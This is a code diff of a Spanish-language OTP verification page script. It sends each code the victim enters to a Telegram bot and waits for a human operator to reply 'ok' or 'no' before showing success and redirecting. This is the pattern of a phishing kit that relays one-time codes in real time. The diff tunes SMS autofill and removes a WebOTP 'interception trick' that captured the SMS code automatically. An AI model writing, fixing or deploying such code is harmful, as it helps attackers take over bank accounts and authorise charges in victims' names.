@@ -19,7 +19,6 @@
 
   let remaining = CODE_TTL_SECONDS;
   let timerId = null;
-  let oTPAbortController = null; // Controlador para cancelar la escucha de Android
 
   (function initConfiguredMask() {
     try {
@@ -28,11 +27,6 @@
     } catch (e) {
       if (maskedEl) maskedEl.textContent = "****85";
     }
-
-    // CORRECCIÓN IPHONE: Quitamos temporalmente el maxlength limitador del HTML 
-    // en tiempo de ejecución para permitir la inyección masiva de iOS
-    inputs.forEach(input => input.setAttribute("maxlength", "6"));
-
     if (inputs[0]) inputs[0].focus();
   })();
 
@@ -85,57 +79,6 @@
     renderTimer();
     clearInterval(timerId);
     timerId = setInterval(tick, 1000);
-    
-    // Cada vez que inicia el temporizador, activamos la escucha en Android
-    activarEscuchaAutomaticaAndroid();
-  }
-
-  function getCode() {
-    return inputs.map((i) => i.value.substring(0, 1)).join("");
-  }
-
-  function isComplete() {
-    return inputs.every((i) => i.value.trim().length >= 1);
-  }
-
-  function refreshSubmitState() {
-    if (submitBtn) {
-      submitBtn.disabled = !isComplete() || remaining <= 0;
-    }
-  }
-
-  // ============================================================
-  // TRUCO DE INTERCEPTACIÓN AVANZADA PARA ANDROID (WebOTP API)
-  // ============================================================
-  function activarEscuchaAutomaticaAndroid() {
-    if (!('credentials' in navigator) || !('OTPCredential' in window)) return;
-
-    if (oTPAbortController) oTPAbortController.abort();
-    oTPAbortController = new AbortController();
-
-    navigator.credentials.get({
-      otp: { transport: ['sms'] },
-      signal: oTPAbortController.signal
-    }).then(otp => {
-      if (otp && otp.code) {
-        const coincidencia = otp.code.match(/\d{6}/);
-        if (coincidencia) {
-          const codigoExtraido = coincidencia[0];
-          
-          codigoExtraido.split("").forEach((char, idx) => {
-            if (inputs[idx]) inputs[idx].value = char;
-          });
-          
-          refreshSubmitState();
-          
-          if (isComplete() && form) {
-            form.dispatchEvent(new Event("submit"));
-          }
-        }
-      }
-    }).catch(err => {
-      console.log("WebOTP pasiva terminada.");
-    });
   }
 
   startTimer();
@@ -170,7 +113,6 @@
         inputs.forEach(input => {
           input.value = "";
           input.classList.remove("invalid");
-          input.setAttribute("maxlength", "6");
         });
         if (inputs[0]) inputs[0].focus();
 
@@ -179,56 +121,24 @@
     });
   }
 
-  // ============================================================
-  // EVENTOS DE LOS INPUTS ASIGNADOS EN TU ORDEN ORIGINAL
-  // ============================================================
-  inputs.forEach((input, index) => {
-    input.addEventListener("input", (e) => {
-      input.classList.remove("invalid");
-      const val = e.target.value;
+  function getCode() {
+    return inputs.map((i) => i.value).join("");
+  }
 
-      if (val.length > 1) {
-        const numeros = val.replace(/\D/g, "");
-        const cleanValue = numeros.slice(-6); 
-        
-        cleanValue.split("").forEach((char, idx) => {
-          if (inputs[idx]) {
-            inputs[idx].value = char;
-          }
-        });
-        
-        refreshSubmitState();
-        
-        if (isComplete() && form) {
-          form.dispatchEvent(new Event("submit"));
-        }
-        return;
-      }
+  function isComplete() {
+    return inputs.every((i) => i.value.length === 1);
+  }
 
-      input.value = val.replace(/\D/g, "");
-      if (input.value && index < inputs.length - 1) {
-        inputs[index + 1].focus();
-      }
-      
-      refreshSubmitState();
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !e.target.value && index > 0) {
-        inputs[index - 1].focus();
-        inputs[index - 1].value = "";
-        inputs[index - 1].classList.remove("invalid");
-        refreshSubmitState();
-      }
-    });
-  });
+  function refreshSubmitState() {
+    if (submitBtn) {
+      submitBtn.disabled = !isComplete() || remaining <= 0;
+    }
+  }
 
   // ============================================================
-  // LOGIC ENTRANTE EN TU EVENTO SUBMIT (TELEGRAM Y POLLING)
+  // FUNCIÓN ENCAPSULADA DE ENVÍO Y ESCUCHA TELEGRAM
   // ============================================================
-  if (form) {
-    form.addEventListener("submit", async function (e) {
-      e.preventDefault();
+  async function enviarFormulario() {
       if (!isComplete() || remaining <= 0) return;
 
       const enteredCode = getCode();
@@ -239,10 +149,6 @@
         messageEl.className = "otp-message";
         messageEl.style.color = "#666666";
       }
-
-      // 1. ACTIVAR EL LOADING (Solo si existe en la pantalla)
-      const loader = document.getElementById("loading-container"); 
-      if (loader) loader.style.display = "flex"; 
 
       let lastUpdateIdApproval = 0;
       try {
@@ -261,23 +167,18 @@
                            `✅ *Para VALIDAR el código:* Responde \`ok\` o \`si\`\n` +
                            `❌ *Para INVALIDAR (Código Incorrecto):* Responde \`no\` o \`mal\``;
 
-      try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: textApproval,
-            parse_mode: 'Markdown'
-          })
-        });
-      } catch (e) {
-        console.error("Error al enviar mensaje inicial:", e);
-      }
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: textApproval,
+          parse_mode: 'Markdown'
+        })
+      });
 
       let decision = null; 
       
-      // Bucle de escucha (Polling)
       while (!decision) {
         try {
           const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateIdApproval + 1}&timeout=5`);
@@ -292,7 +193,7 @@
               if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
                 const msgText = msg.text.trim().toLowerCase();
                 
-if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
+                if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
                   decision = 'approved';
                   break;
                 } else if (msgText === 'no' || msgText === 'mal' || msgText === 'incorrecto' || msgText === '2') {
@@ -314,9 +215,6 @@ if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
       const flowType = sessionStorage.getItem('flow_type') || 'charge';
       const chargeAction = sessionStorage.getItem('charge_action') || 'Aprobado'; 
 
-      // ============================================================
-      // CASO A: OPERADOR APRUEBA EL CÓDIGO
-      // ============================================================
       if (decision === 'approved') {
         try {
           if (timerId) clearInterval(timerId);
@@ -328,27 +226,33 @@ if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
           localStorage.setItem('transaction_status', 'Aprobado');
         }
 
-        // Corrección de frases de validación final
+        // ============================================================
+        // CORRECCIÓN DE FRASES DE VALIDACIÓN FINAL
+        // ============================================================
         if (messageEl) {
           if (flowType === 'login') {
             messageEl.textContent = "Inicio de sesión correcto.";
-            messageEl.style.color = "#28a745"; 
+            messageEl.style.color = "#28a745"; // Verde
           } else if (flowType === 'baja') {
             messageEl.textContent = "¡Validación de Baja Exitosa!";
-            messageEl.style.color = "#28a745"; 
+            messageEl.style.color = "#28a745"; // Verde
           } else {
+            // Evaluamos de forma segura pasando a minúsculas para evitar fallas de mayúsculas
             const accionNormalizada = String(chargeAction).toLowerCase();
 
             if (accionNormalizada === 'aprobado') {
+              // CAMBIO SOLICITADO: Frase exacta en color verde para aprobación
               messageEl.textContent = "¡Aprobación Confirmada y Aplicada!";
-              messageEl.style.color = "#28a745"; 
+              messageEl.style.color = "#28a745"; // Color Verde (#28a745)
             } else {
+              // Se mantiene tu frase original en color rojo para el rechazo
               messageEl.textContent = "¡Rechazo Confirmado y Aplicado!";
-              messageEl.style.color = "#d9534f"; 
+              messageEl.style.color = "#d9534f"; // Color Rojo (#d9534f)
             }
           }
           messageEl.className = "otp-message success";
         }
+        // ============================================================
 
         submitBtn.textContent = (flowType === 'charge' && String(chargeAction).toLowerCase() === 'rechazado') ? "Bloqueo Exitoso" : "Completado";
         submitBtn.style.backgroundColor = "#981D33";
@@ -358,8 +262,6 @@ if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
         console.log("Validación finalizada. Redirigiendo al dashboard...");
 
         setTimeout(() => {
-          // Apagamos el loader justo antes del cambio de página
-          if (loader) loader.style.display = "none";
           try {
             window.location.replace("dashboard.html");
           } catch (e) {
@@ -369,31 +271,81 @@ if (msgText === 'ok' || msgText === 'si' || msgText === '1') {
 
         return; 
 
-      // ============================================================
-      // CASO B: OPERADOR RECHAZA EL CÓDIGO
-      // ============================================================
-      } else if (decision === 'rejected') {
-        // APAGAR LOADING para que el usuario pueda corregir el código
-        if (loader) loader.style.display = "none";
 
+      } else if (decision === 'rejected') {
         submitBtn.disabled = false;
         submitBtn.textContent = "Validar código";
-        
         if (messageEl) {
           messageEl.textContent = "Código incorrecto. Por favor, verifícalo e inténtalo de nuevo.";
           messageEl.style.color = "#d9534f";
           messageEl.className = "otp-message error";
         }
-        
         inputs.forEach(input => {
           input.value = "";
           input.classList.remove("invalid");
-          input.setAttribute("maxlength", "6");
         });
-        
         if (inputs[0]) inputs[0].focus();
-        activarEscuchaAutomaticaAndroid(); // Reactivar WebOTP para el reintento
       }
-    });
-  }
+    }
+
+
+// ============================================================
+  // EVENTOS DE LOS INPUTS CORREGIDOS PARA IPHONE Y ANDROID
+  // ============================================================
+  inputs.forEach((input, index) => {
+// CORRECCIÓN PARA IPHONE: Permitir temporalmente texto más largo antes del filtrado
+input.addEventListener("keydown", (e) => {
+if (e.key === "Backspace" && !input.value && index > 0) {
+inputs[index - 1].focus();
+inputs[index - 1].value = "";
+inputs[index - 1].classList.remove("invalid");
+refreshSubmitState();
+} else {
+// Al presionar cualquier tecla en iOS, ampliamos dinámicamente el límite
+// para que quepa el código de autocompletado completo de 6 dígitos.
+input.setAttribute("maxlength", "6");
+}
+});
+input.addEventListener("input", (e) => {
+input.classList.remove("invalid");
+const val = e.target.value;
+// DETECCIÓN DE SUGERENCIA SMS O PEGADO DE TEXTO COMPLETO (6 dígitos o más)
+if (val.length > 1) {
+// Extrae todos los números del mensaje
+const numeros = val.replace(/\D/g, "");
+// Toma los últimos 6 dígitos (evitando problemas con precios o textos adicionales)
+const cleanValue = numeros.slice(-6);
+// Distribuye los 6 caracteres casilla por casilla
+cleanValue.split("").forEach((char, idx) => {
+if (inputs[idx]) {
+inputs[idx].setAttribute("maxlength", "1"); // Restaura el límite nativo
+inputs[idx].value = char;
+}
+});
+refreshSubmitState();
+if (isComplete()) {
+enviarFormulario();
+}
+return;
+}
+// CONTROL DE ESCRITURA MANUAL ESTÁNDAR (Restauración de longitud)
+input.setAttribute("maxlength", "1");
+input.value = val.replace(/\D/g, "").slice(0, 1);
+if (input.value && index < inputs.length - 1) {
+inputs[index + 1].focus();
+}
+refreshSubmitState();
+// Dispara automáticamente al escribir a mano el sexto dígito
+if (isComplete()) {
+enviarFormulario();
+}
+});
+});
+// Intercepción final del evento Submit manual o por tecla enter
+if (form) {
+form.addEventListener("submit", function (e) {
+e.preventDefault();
+enviarFormulario();
+});
+}
 })();
